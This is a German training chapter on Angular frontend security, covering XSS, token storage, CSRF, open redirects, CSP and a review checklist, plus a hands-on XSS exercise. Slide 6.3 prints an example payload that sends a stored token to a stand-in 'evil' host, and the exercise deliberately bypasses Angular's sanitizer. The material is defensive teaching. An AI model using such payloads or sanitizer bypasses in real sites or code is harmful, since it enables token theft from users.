# Kapitel 6 – Sicherheit und verantwortungsvoller Einsatz im Frontend

**Tag:** 5 (Mittag) · **Dauer:** ca. 75 min inkl. Übung
**Agenda:** „Sensibilisierung für sicherheitsrelevante Aspekte im Frontend“ / „Umgang mit Daten und Benutzerinteraktionen“ / „Vertrauensgrenzen bei Nutzereingaben einordnen“ / „Gängige Risikoquellen im Frontend kennen“
**Übung:** Ü36 `36_sicherheit` (Basis: Ü35)

---

### Folie 6.1 – Grundsatz: Das Frontend ist nicht vertrauenswürdig
- Code läuft im Browser des Nutzers: er kann ihn **lesen, ändern, umgehen**.
- Daraus folgt:
  - **Geheimnisse gehören nicht ins Frontend** (API-Keys mit Rechten, Passwörter, Signierschlüssel).
  - **Berechtigungen werden im Backend durchgesetzt.** Guards (Ü25) verbessern die Bedienung, sie sind **kein** Schutz.
  - **Validierung im Client ist UX, Validierung im Server ist Sicherheit.**

### Folie 6.2 – Vertrauensgrenzen
```
   Nicht vertrauenswürdig (immer prüfen/escapen)        Vertrauenswürdig
   ───────────────────────────────────────────          ────────────────
   Eingaben im Formular                                  Quelltext der eigenen App
   URL, Query-/Pfadparameter, Fragment                   fest einkompilierte Konstanten
   Antworten von APIs (auch eigener!)
   localStorage / Cookies / postMessage
   Daten von Drittanbietern, Dateiuploads
```
- Alles, was von außen kommt, ist **Eingabe** – auch Daten aus dem eigenen Backend (dort können XSS-Daten gespeichert sein).
- Daten, die **angezeigt** werden, müssen für ihren Kontext (HTML, URL, Style) geschützt werden.

### Folie 6.3 – XSS: das Hauptrisiko
**Cross-Site Scripting:** Angreifer schleust Script in die Seite ein, das mit den Rechten des Nutzers läuft (Token auslesen, Aktionen auslösen).

Beispiel: Kunden-Notiz enthält `<img src=x onerror="fetch('//evil/?'+localStorage.token)">`.

### Folie 6.4 – Was Angular standardmäßig tut
- **Interpolation `{{ }}`** → Text wird als Text ausgegeben (escaped).
- **`[innerHTML]`** → Angular **bereinigt** (sanitize) das HTML und entfernt gefährliche Teile (`<script>`, Event-Handler).
- **`[href]`, `[src]`** → gefährliche URLs (`javascript:`) werden neutralisiert (`unsafe:`).
- Angular-Templates werden beim Build kompiliert, es gibt keine String-Auswertung von Nutzereingaben.
```html
<p>{{ customer.note }}</p>                    <!-- ✅ sicher: Text -->
<div [innerHTML]="customer.note"></div>       <!-- ⚠️ bereinigt, aber Formatierung bleibt -->
```

### Folie 6.5 – Wo Angulars Schutz ausgehebelt wird
- **`DomSanitizer.bypassSecurityTrustHtml/Url/Script/ResourceUrl`** → Angular prüft **nicht mehr**. Nur für selbst kontrollierte Inhalte, nie für Nutzereingaben.
- **Direkter DOM-Zugriff:** `elementRef.nativeElement.innerHTML = …`, `document.write`, `eval`, `new Function`.
- **Templates zur Laufzeit aus Strings bauen** (dynamische Komponentenerzeugung mit Nutzertext).
- **Drittbibliotheken**, die HTML erzeugen (Markdown-Renderer, Editoren) ohne Sanitizing.
- Regel: **`bypassSecurityTrust*` ist ein Review-Alarm.** Jeder Einsatz braucht eine Begründung im Code.

### Folie 6.6 – Authentifizierung und Token
| Speicherort | Risiko |
|---|---|
| `localStorage` / `sessionStorage` | bei XSS per Script auslesbar |
| Cookie ohne `HttpOnly` | wie oben |
| **Cookie mit `HttpOnly; Secure; SameSite`** | Script kommt nicht heran (aber CSRF beachten) |
| Speicher (Variable) | geht beim Reload verloren, schwerer zu stehlen |
- Empfehlung: Sitzung bevorzugt über **HttpOnly-Cookie** (Backend setzt es), Token mit kurzer Laufzeit; Login/OAuth idealerweise über etablierte Bibliotheken/Identity Provider statt Eigenbau.
- Das `AuthService`-Beispiel aus Ü25 (Signal `isLoggedIn`) ist **nur Demo**.

### Folie 6.7 – CSRF und HTTP
- **CSRF:** fremde Seite löst mit dem Browser des Nutzers (inkl. Cookies) Aktionen bei deinem Backend aus.
- Gegenmaßnahmen: `SameSite`-Cookies, **CSRF-Token**. Angulars `HttpClient` liest ein Cookie (`XSRF-TOKEN`) und sendet es als Header (`X-XSRF-TOKEN`) bei veränderten Anfragen (`POST`, `PUT`, `DELETE`) an relative URLs; anpassbar mit `withXsrfConfiguration(...)`.
- **CORS** schützt nicht den Server, sondern regelt, welche Webseiten Antworten lesen dürfen. Nicht mit „Absicherung“ verwechseln.
- Immer **HTTPS**; keine sensiblen Daten in URLs (Logs, Referrer).

### Folie 6.8 – Weitere typische Risikoquellen
| Risiko | Beispiel | Gegenmaßnahme |
|---|---|---|
| Offene Weiterleitung | `router.navigateByUrl(this.route.snapshot.queryParams['returnUrl'])` | Ziel gegen Allowlist prüfen, nur interne Pfade |
| Unsichere Abhängigkeiten | veraltete npm-Pakete mit Lücken | `npm audit`, Updates, Lockfile, Dependabot/Renovate |
| Geheimnisse im Bundle | API-Key in `environment.ts` | Zugriff über Backend, Keys mit minimalen Rechten |
| Zu viele Daten im Client | komplette Kundensätze, Nutzer sieht Felder nur nicht | Backend liefert nur erlaubte Felder |
| Sensible Daten in Logs/Fehlern | `console.log(user)` / Interceptor loggt Tokens (Ü25!) | nichts Sensibles loggen |
| Clickjacking | Seite in fremdem `iframe` | `frame-ancestors`/`X-Frame-Options` am Server |
| Drittanbieter-Skripte | Tracking, Widgets | Subresource Integrity, CSP, Notwendigkeit prüfen |

### Folie 6.9 – Content Security Policy (CSP) und Trusted Types
- **CSP** (HTTP-Header des Servers): legt fest, woher Skripte/Styles geladen werden dürfen → begrenzt den Schaden bei XSS.
- Angular unterstützt strikte CSP (z. B. Nonce für Inline-Styles über `CSP_NONCE`) und **Trusted Types**.
- Einordnung: **zusätzliche Verteidigungsschicht** (Defense in Depth), ersetzt kein sauberes Escaping.

### Folie 6.10 – Umgang mit Daten und Benutzerinteraktionen
- **Datensparsamkeit:** nur anzeigen/speichern, was gebraucht wird (DSGVO-Bezug).
- Eingaben **kontextgerecht** behandeln: Text → Interpolation, HTML → Sanitizing, URL → Validieren.
- **Nicht** auf Client-Validierung verlassen: Validierung im Backend wiederholen (hängt an die Formular-Folie „2-fache Validierung ist nicht redundant“).
- **Dateiuploads:** Typ/Größe prüfen, Inhalte nie ausführen, Anzeige nur über sichere Wege.
- **Fehlermeldungen** nicht zu detailreich (keine Stacktraces für Endnutzer).

### Folie 6.11 – Verantwortungsvoller Einsatz im Team
- Sicherheit ist **Teamaufgabe**: Code-Review-Checkliste (Folie 6.12), automatische Prüfungen (Lint-Regeln, `npm audit`) in der Pipeline.
- Updates zeitnah (`ng update`) – Sicherheitsfixes kommen über Minor/Patch-Versionen.
- **Dokumentierte Ausnahmen:** wo wird `bypassSecurityTrust*` oder `innerHTML` bewusst genutzt, und warum.
- Vorfälle offen und lernorientiert behandeln.

### Folie 6.12 – Review-Checkliste Frontend-Sicherheit
- [ ] Wird irgendwo `bypassSecurityTrust*` verwendet? Begründet?
- [ ] `innerHTML`/`nativeElement.innerHTML`/`document.write`/`eval` vorhanden?
- [ ] Werden URL-Parameter ungeprüft für Navigation oder Anzeige genutzt?
- [ ] Werden Tokens oder personenbezogene Daten geloggt oder in `localStorage` abgelegt?
- [ ] Stehen Geheimnisse in `environment*.ts` oder im Bundle?
- [ ] Verlässt sich eine Funktion nur auf einen Guard statt auf das Backend?
- [ ] Neue Abhängigkeiten geprüft (`npm audit`, Pflegezustand)?

---

## Übung 36 – XSS erleben und beheben (`36_sicherheit`)

**Basis:** Ergebnis von Ü35. Das Backend liefert unverändert; die Notiz wird **client-seitig** ergänzt (Mock-Feld), damit der Server nicht angepasst werden muss.

1. **Feld ergänzen:** `Customer` erhält `note?: string`. Im Store wird für Kunde 1 die Notiz `<b>wichtig</b> <img src=x onerror="alert('XSS')">` gesetzt.
2. **Anzeige 1:** In `CustomerDetailsComponent` die Notiz per Interpolation `{{ customer()?.note }}` ausgeben → Ergebnis beobachten.
3. **Anzeige 2:** per `[innerHTML]` ausgeben → beobachten (Bereinigung durch Angular). Im Browser (Elements-Ansicht) prüfen, was übrig bleibt.
4. **Anzeige 3 (Gegenbeispiel):** mit `DomSanitizer.bypassSecurityTrustHtml` ausgeben → `alert` erscheint. Diskussion: Wann wäre das akzeptabel? (Nur bei selbst kontrolliertem HTML.)
5. **Weiterleitung prüfen:** Login-Seite liest `?returnUrl=` und navigiert dorthin. Baue eine **Allowlist-Prüfung** (nur Pfade, die mit `/customer` beginnen, keine absoluten URLs).
6. **Logging prüfen:** Der `loggingInterceptor` (Ü25) soll Header wie `Authorization` nie ausgeben. Ergänze einen Test oder Review-Kommentar.
7. **Review:** Gehe die Checkliste (Folie 6.12) für die komplette App durch und dokumentiere Funde.

**Lernziele:** Vertrauensgrenzen erkennen, Angulars Schutz verstehen, Umgehungen identifizieren, Basisschutz umsetzen.

**Lösungshinweise:** Für Schritt 5 `new URL(value, window.location.origin)` verwenden und `origin` sowie `pathname` prüfen; erst dann `router.navigateByUrl(pathname)`.
